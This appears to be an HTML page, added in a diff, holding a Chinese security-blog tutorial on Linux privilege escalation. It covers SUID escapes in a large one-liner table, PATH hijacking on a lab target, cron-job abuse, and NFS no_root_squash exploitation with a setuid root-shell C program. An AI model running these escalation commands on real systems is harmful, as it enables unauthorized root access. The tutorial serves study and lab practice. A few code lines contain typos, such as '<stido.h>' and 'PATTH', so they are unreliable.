@@ -1,0 +1,243 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>linux提权-1 | Hao's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=undefined"><link rel="stylesheet" type="text/css" href="https://unpkg.com/normalize.css"><link rel="stylesheet" type="text/css" href="https://unpkg.com/purecss/build/pure-min.css"><link rel="stylesheet" type="text/css" href="https://unpkg.com/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="https://unpkg.com/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="https://unpkg.com/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="https://unpkg.com/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="https://unpkg.com/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="https://unpkg.com/toastr/build/toastr.min.css"><div class="darkmode-toggle">🌓</div><script>var prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)');
+var toggle = document.querySelector('.darkmode-toggle');
+var html = document.querySelector('html');
+
+html.dataset.dark = localStorage.dark || prefersDarkMode.matches;
+
+toggle.addEventListener('click', () => {
+localStorage.dark = !(html.dataset.dark == 'true');
+html.dataset.dark = localStorage.dark;
+});</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">linux提权-1</h1><a id="logo" href="/.">Hao's Blog</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">linux提权-1</h1><div class="post-meta">2025-06-17<span> | </span><span class="category"><a href="/categories/linux%E6%8F%90%E6%9D%83/">linux提权</a></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#linux%E6%8F%90%E6%9D%83-1"><span class="toc-number">1.</span> <span class="toc-text">linux提权-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%EF%BC%8CSUID%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">1，SUID提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.1.</span> <span class="toc-text">常用指令提权方法:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%EF%BC%8CSUDO%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">2，SUDO提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%EF%BC%8CPATH%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">3，PATH提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%EF%BC%8CPATH%E5%8A%AB%E6%8C%81"><span class="toc-number">1.5.</span> <span class="toc-text">4，PATH劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%EF%BC%8C%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">4，定时任务提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%EF%BC%8CNFS%E6%8F%90%E6%9D%83"><span class="toc-number">1.7.</span> <span class="toc-text">5，NFS提权</span></a></li></ol></li></ol></div></div><div class="post-content"><h1 id="linux提权-1"><a href="#linux提权-1" class="headerlink" title="linux提权-1"></a>linux提权-1</h1><p>《Linux提权方法论》<br><a target="_blank" rel="noopener" href="https://github.com/Getshell/LinuxTQ">https://github.com/Getshell/LinuxTQ</a><br>提权网站：<br><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11110">https://xz.aliyun.com/news/11110</a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>当前主机的操作系统</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hostnamectl</span><br><span class="line">cat /etc/*-release</span><br><span class="line">lsb_release -a </span><br><span class="line">cat /etc/lsb-release # Debain</span><br><span class="line">cat /etc/redhat-release # Redhat</span><br><span class="line">cat /etc/centos-release  # Centos</span><br><span class="line">cat /etc/os-release  # Ubuntu</span><br><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure>
+<p>当前主机的内核版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hostnamectl</span><br><span class="line">uname -a </span><br><span class="line">cat /proc/version</span><br><span class="line">dmesg | grep &quot;Linux version&quot;</span><br></pre></td></tr></table></figure>
+
+<p>内核漏洞筛选：<br>MSF检测：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure>
+<p>提权脚本:<br><a target="_blank" rel="noopener" href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a><br><a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></p>
+<p>综合脚本：<br><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng">https://github.com/peass-ng/PEASS-ng</a><br><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p>
+<h2 id="1，SUID提权"><a href="#1，SUID提权" class="headerlink" title="1，SUID提权"></a>1，SUID提权</h2><p>SUID(Set ownerUserIDupon execution)是给予文件的一个特殊类型的文件权限。在Linux&#x2F;Unix中，当一个程序运行的时候，程序将从登录用户处继承权限。<br>SUID被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件。用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。</p>
+<p>查看文件是否具有SUID属性</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -al file(此为要查询的文件名)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如查看<span class="built_in">sudo</span>文件的SUID属性</span></span><br><span class="line">ls -al /usr/bin/sudo</span><br></pre></td></tr></table></figure>
+
+<p>SUID提权利用原理<br>SUID(Set User ID)是对二进制程序进行的一种特殊权限设置，可以让二进制程序的执行者临时拥有文件属主的权限，也正是因为这个特性，假设我们以非 root 用户身份访问目标系统，并且我们发现启用了 suid 位的二进制文件，那么这些文件&#x2F;程序&#x2F;命令可以以 root 权限运行。</p>
+<p>如何查找 SUID 文件<br>查找当前用户可利用的具有SUID的属性的质量</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">参数：</span><br><span class="line">	/表示从文件系统的顶部（根）开始，查找每个目录</span><br><span class="line">	-perm表示搜索后面的权限</span><br><span class="line">	-u=s表示查找 root 用户拥有的文件</span><br><span class="line">	-type表示我们正在寻找的文件类型</span><br><span class="line">	f 表示普通文件，而不是目录或特殊文件</span><br><span class="line">	2表示到进程的第二个文件描述符，即 stderr（标准错误）</span><br><span class="line"><span class="meta prompt_">	&gt;</span><span class="language-bash">表示重定向</span></span><br><span class="line">	/dev/null是一个特殊的文件系统对象，它会丢弃写入其中的所有内容</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用指令提权方法"><a href="#常用指令提权方法" class="headerlink" title="常用指令提权方法:"></a><strong>常用指令提权方法:</strong></h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>利用方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>zsh</td>
+<td>zsh</td>
+</tr>
+<tr>
+<td>xargs</td>
+<td>xargs -a &#x2F;dev&#x2F;null sh -p</td>
+</tr>
+<tr>
+<td>watch</td>
+<td>watch -x sh -c ‘reset; exec sh -p 1&gt;&amp;0 2&gt;&amp;0’</td>
+</tr>
+<tr>
+<td>timeout</td>
+<td>timeout 7d &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td>time</td>
+<td>time &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td>tclsh</td>
+<td>1、tclsh 2、exec &#x2F;bin&#x2F;sh -p &lt;@stdin &gt;@stdout2&gt;@stderr</td>
+</tr>
+<tr>
+<td>taskset</td>
+<td>taskset 1 &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td>stdbuf</td>
+<td>stdbuf -i0 &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td>strace</td>
+<td>strace -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td>ssh</td>
+<td>ssh -o ProxyCommand&#x3D;’;sh -p 0&lt;&amp;2 1&gt;&amp;2’ x</td>
+</tr>
+<tr>
+<td>setarch</td>
+<td>setarch $(arch) &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td>rsync</td>
+<td>rsync -e ‘sh -p -c “sh -p 0&lt;&amp;2 1&gt;&amp;2”’ 127.0.0.1:&#x2F;dev&#x2F;null</td>
+</tr>
+<tr>
+<td>rpm</td>
+<td>rpm –eval ‘%{lua:os.execute(“&#x2F;bin&#x2F;sh -p”)}’</td>
+</tr>
+<tr>
+<td>python</td>
+<td>python -c ‘import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’</td>
+</tr>
+<tr>
+<td>php</td>
+<td>1、CMD&#x3D;”&#x2F;bin&#x2F;sh” 2、 php -r “pcntl_exec(‘&#x2F;bin&#x2F;sh’, [‘-p’]);”</td>
+</tr>
+<tr>
+<td>nice</td>
+<td>nice &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td>nano</td>
+<td>1、nano &#x2F;&#x2F;运行nano程序 2、^R &#x2F;&#x2F;按下ctrl-r 3、^X &#x2F;&#x2F;按下ctrl-x 4、reset; sh -p 1&gt;&amp;0 2&gt;&amp;0 &#x2F;&#x2F;输入下面的命令</td>
+</tr>
+<tr>
+<td>more</td>
+<td>1、more &#x2F;etc&#x2F;profile 2、!&#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td>logsave</td>
+<td>logsave &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -i -p</td>
+</tr>
+<tr>
+<td>less</td>
+<td>less &#x2F;etc&#x2F;profile &#x2F;&#x2F;读取文件，在底行输入!&#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td>ksh</td>
+<td>ksh -p</td>
+</tr>
+<tr>
+<td>ip</td>
+<td>1、ip netns add foo 2、ip netns exec foo &#x2F;bin&#x2F;sh -p 3、ip netns delete foo</td>
+</tr>
+<tr>
+<td>ionice</td>
+<td>ionice &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td>git</td>
+<td>git help status</td>
+</tr>
+<tr>
+<td>gimp</td>
+<td>gimp -idf –batch-interpreter&#x3D;python-fu-eval -b ‘import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’</td>
+</tr>
+<tr>
+<td>gdb</td>
+<td>gdb -nx -ex ‘python import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’ -ex quit</td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>ftp &#x2F;&#x2F;在底行输入”!&#x2F;bin&#x2F;sh -p”</td>
+</tr>
+<tr>
+<td>flock</td>
+<td>flock -u &#x2F; &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td>find</td>
+<td>find . &#x2F; -exec “&#x2F;bin&#x2F;sh” -p</td>
+</tr>
+<tr>
+<td>expect</td>
+<td>expect -c ‘spawn &#x2F;bin&#x2F;sh -p;interact’</td>
+</tr>
+<tr>
+<td>env</td>
+<td>env &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td>ed</td>
+<td>ed &#x2F;&#x2F;在底行输入”!&#x2F;bin&#x2F;sh -p”</td>
+</tr>
+<tr>
+<td>docker</td>
+<td>docker run -v &#x2F;:&#x2F;mnt –rm -it alpine chroot &#x2F;mnt sh</td>
+</tr>
+<tr>
+<td>dmesg</td>
+<td>dmesg -H&#x2F;&#x2F;在底行输入”!&#x2F;bin&#x2F;sh -p”</td>
+</tr>
+<tr>
+<td>csh</td>
+<td>csh -b</td>
+</tr>
+<tr>
+<td>bash</td>
+<td>bash -p</td>
+</tr>
+<tr>
+<td>awk</td>
+<td>awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash -p”)}’</td>
+</tr>
+<tr>
+<td>perl</td>
+<td>perl exec “&#x2F;bin&#x2F;bash”;</td>
+</tr>
+<tr>
+<td>Vi&#x2F;Vim</td>
+<td>vim.basic &#x2F;etc&#x2F;passwd 添加一个新的用户条目或修改现有用户条目的密码哈希，然后保存并退出。格式：newuser:$6$salt$hash:uid:gid:GECOS:home:shell 保存修改后的&#x2F;etc&#x2F;passwd文件，并以新用户身份登录或使用su命令切换到新用户。</td>
+</tr>
+<tr>
+<td>cp</td>
+<td>cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash &#x2F;&#x2F;覆盖&#x2F;bin&#x2F;bash来创建一个后门 ;chmod u+s &#x2F;tmp&#x2F;bash;执行&#x2F;tmp&#x2F;bash -p可以获取一个root权限的shell</td>
+</tr>
+</tbody></table>
+<p>确定要用的指令(以gdb为例)，并输入利用指令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br></pre></td></tr></table></figure>
+
+<h2 id="2，SUDO提权"><a href="#2，SUDO提权" class="headerlink" title="2，SUDO提权"></a>2，SUDO提权</h2><p>SUDO权限是root把本来只能超级用户执行的命令赋予普通用户执行，系统管理员集中的管理用户使用权限和使用主机，配置文件：&#x2F;etc&#x2F;sudoers</p>
+<h2 id="3，PATH提权"><a href="#3，PATH提权" class="headerlink" title="3，PATH提权"></a>3，PATH提权</h2><p>需要结合SUID提权<br>以一个靶场为例：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-04%20221045.png"><br>当那些shell后，查找SUID存在第三方文件<br>&#x2F;opt&#x2F;statuscheck</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span>s /opt/statuscheck <span class="comment">//查看文件中含有的字符串</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-04%20221553.png"><br>&#x2F;opt&#x2F;statuscheck存在执行<br>利用方式：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/sh&quot; &gt; curl  # 在tmp目录下创建curl文件，包含“/bin/sh”</span><br><span class="line">chmod 777 curl  # 赋予权限</span><br><span class="line">export PATH=/tmp:$PATH  # 将/tmp添加到环境变量中，可以让系统不会执行默认的curl工具</span><br><span class="line">echo $PATH</span><br><span class="line">/opt/statuscheck   #执行文件触发curl</span><br></pre></td></tr></table></figure>
+
+<p>根据此靶场就好理解了，将原生的内容劫持后，执行自己添加的到环境的内容</p>
+<h2 id="4，PATH劫持"><a href="#4，PATH劫持" class="headerlink" title="4，PATH劫持"></a>4，PATH劫持</h2><p>查看定时任务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+<p>发现定义了诸多环境变量，如果其任务有 未指定绝对路径的指令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@izjf ~]# cat /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATTH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br></pre></td></tr></table></figure>
+<p>发现定义了诸多环境变量，如果其任务有 未指定绝对路径的指令，如</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*    * * *   root    <span class="keyword">shell</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
+
+<p>而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持。</p>
+<p>找到可写目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>比如在 &#x2F;sbin 写入一个 反弹 shell 功能的 shell.sh，那么就可以造成提权。</p>
+<h2 id="4，定时任务提权"><a href="#4，定时任务提权" class="headerlink" title="4，定时任务提权"></a>4，定时任务提权</h2><p>定时任务（cron job）可以用来设置周期执行的命令，提权的原理为计划任务以root权限运行，计划任务中的脚本其他用户有写入的权限，或者脚本所属组为其他用户，则可以进行计划任务提权。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br></pre></td></tr></table></figure>
+<p>如果我们有幸有权限能更改其中一个任务指定的脚本，就可以往脚本里添加如反弹 shell 等指令，从而提权.</p>
+<h2 id="5，NFS提权"><a href="#5，NFS提权" class="headerlink" title="5，NFS提权"></a>5，NFS提权</h2><p>NFS 是一种运行在端口 2049 上的网络文件共享协议，由服务器和客户端两个组件组成。共享目录是在 NFS 服务器上创建的，以便可以通过网络与其他 Linux 客户端共享文件，获得许可的用户可以将文件添加到共享中，然后与有权访问该目录的其他用户共享。</p>
+<p>默认情况下，每个 NFS 共享均启用了 root_squash 功能，用以防止被共享的文件拥有 root:root 身份或特殊权限（即启用 root_squash 之后，共享文件均是 nobody:nogroup 身份）。而如果启用了 no_root_squash 功能，那么共享文件就可以以 root 的身份存在，我们将在本篇文章中看到，这很容易导致权限升级。</p>
+<p>枚举 NFS 共享：<br>1，使用 Nmap 枚举 NFS 共享<br>2，使用 showmount 命令进行枚举</p>
+<p>挂载 NFS 共享：<br>我们需要做的第一件事是在攻击者机器上创建一个挂载点，以便与共享进行交互。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /mnt/nfs</span><br></pre></td></tr></table></figure>
+<p>创建挂载点后，我们就可以挂载共享并将其链接到挂载点。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 192.168.1.5:/mnt/nfs ./nfs  #攻击机执行</span><br></pre></td></tr></table></figure>
+<p>成功后，只要往本机的nfs文件放内容，对方的nfs上也会实时同步<br>利用：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(root@kali)-[~/nfs]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> /usr/bin/find shell //将find命令拷贝到shell中</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">chmod</span> 777 shell	//赋予权限</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">chmod</span> +s shell	//赋予suid权限</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/mnt/nfs/shell . / -exec &quot;/bin/sh&quot; -p;quit //进行提权</span><br></pre></td></tr></table></figure>
+<p>注意：系统不同find命令也会不同，导致运行出错<br>解决：<br>1，用相同的系统拷贝&#x2F;usr&#x2F;bin&#x2F;find<br>2，写一个c语言进行调用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stido.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setuid(<span class="number">0</span>);</span><br><span class="line">	system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将shell.c编译成可执行文件，</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc shell.c -o getshell</span><br></pre></td></tr></table></figure>
+<p>赋SUID权限，再传入nfs中。</p>
+<p>python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">bin</span>/python3</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">        os.system(<span class="string">&quot;thm&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure></div><div class="tags"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag">linux提权</a></li></ul></div><div class="post-nav"><a class="pre" href="/2025/06/17/linux%E6%8F%90%E6%9D%83-2/">linux提权-2</a><a class="next" href="/2025/06/17/kubernetes-goat%E9%9D%B6%E5%9C%BA/">kubernetes-goat靶场</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="author-info"><a class="info-avatar" href="/about/" title="关于"><img class="nofancybox" src="/img/avatar.jpg"/></a><p>所幸仍有光.</p><a class="info-icon" href="https://hackerhao.top" title="Email" target="_blank" style="margin-inline:5px"> <i class="fa fa-envelope-square" style="margin-inline:5px"></i></a><a class="info-icon" href="https://github.com/isMyHao" title="Github" target="_blank" style="margin-inline:5px"> <i class="fa fa-github-square" style="margin-inline:5px"></i></a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">Java基础知识</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Js%E5%AE%89%E5%85%A8/">Js安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHP代码审计</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP%E5%AE%89%E5%85%A8/">PHP安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Win%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">Win权限提升</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E6%8F%90%E6%9D%83/">linux提权</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">云安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%8D%E6%9D%80/">免杀</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91/">内网</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="category-list-count">12</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">权限提升</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/">漏洞发现</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 15px;">基础</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 15px;">免杀</a> <a href="/tags/Js%E5%AE%89%E5%85%A8/" style="font-size: 15px;">Js安全</a> <a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 15px;">Java基础</a> <a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 15px;">Java安全</a> <a href="/tags/PHP%E5%AE%89%E5%85%A8/" style="font-size: 15px;">PHP安全</a> <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 15px;">PHP代码审计</a> <a href="/tags/linux%E6%8F%90%E6%9D%83/" style="font-size: 15px;">linux提权</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 15px;">靶场</a> <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" style="font-size: 15px;">云安全</a> <a href="/tags/tools/" style="font-size: 15px;">tools</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 15px;">内网</a> <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" style="font-size: 15px;">权限提升</a> <a href="/tags/Win%E6%8F%90%E5%8D%87/" style="font-size: 15px;">Win提升</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/" style="font-size: 15px;">漏洞发现</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/06/17/%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/">抓包工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/06/17/%E6%8A%93%E5%8C%85/">抓包</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7CDK/">云攻防-自动化工具CDK</a></li><li class="post-list-item"><a class="post-list-link" 